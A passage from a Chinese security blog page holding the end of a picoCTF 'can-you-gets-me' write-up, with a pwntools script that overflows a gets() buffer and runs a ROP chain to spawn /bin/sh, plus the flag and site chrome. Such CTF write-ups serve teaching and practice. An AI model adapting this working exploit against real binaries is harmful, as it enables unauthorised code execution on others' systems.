+    p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
+    p += pack(&#39;&lt;I&#39;, 0x080de955) # pop ecx ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
+    p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
+    p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0806cc25) # int 0x80
+➜  can-you-gets-me
+</code></pre>
+<p>结果确实只要溢出后执行就能getshell了</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+from struct import pack
+n = process(&#39;./gets&#39;)
+# Padding goes here
+p = &#39;a&#39;*0x18 + &#39;aaaa&#39;        # buf
+p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x080de955) # pop ecx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806cc25) # int 0x80
+
+n.recvuntil(&#39;NAME!&#39;)
+n.sendline(p)
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}
+</code></pre>
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="null"></li>
+                <li class="wechat-code"><img src="null"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2019/11/05/LCTF—easypwn详解/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="" data-src="https://p3.ssl.qhimg.com/t017e44e60793f4b08a.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://p3.ssl.qhimg.com/t017e44e60793f4b08a.png">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                LCTF—easypwn详解</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2019/11/05/nox-CSAW部分pwn题解/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                nox_CSAW部分pwn题解</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz",
+        appKey: "EEpyRysaKmv7aOJjR1o9E4Eq",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="https://nepire.github.io/" class="profile gravatar"><img src="/images/title.ico" itemprop="image" alt="nepire" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://nepire.github.io/" itemprop="url" rel="author">nepire</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>逐梦者</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 nepire<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="/images/title.ico">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">艦隊nepire</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="https://github.com/Nepire" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="https://github.com/Nepire" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
+      
+        <a href="https://github.com/Nepire" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/技术/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/生活/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/资源/">
+                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                  资源
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/悦读/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  书单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/bangumi/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  番组
+                </a>
+              </li>
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-headphones" aria-hidden="true"></i>
+                  歌单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/图集/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  图集
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            留言板
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/donate/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+            赞赏
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+              <li>
+                <a href="/theme-sakura/">
+                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                  主题
+                </a>
+              </li>
+            
+              <li>
+                <a href="/lab/">
+                  <i class="fa fa-cogs" aria-hidden="true"></i>
+                  Lab
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/client/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+            客户端
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/atom.xml">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+            RSS
+          </span>
+        </a>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
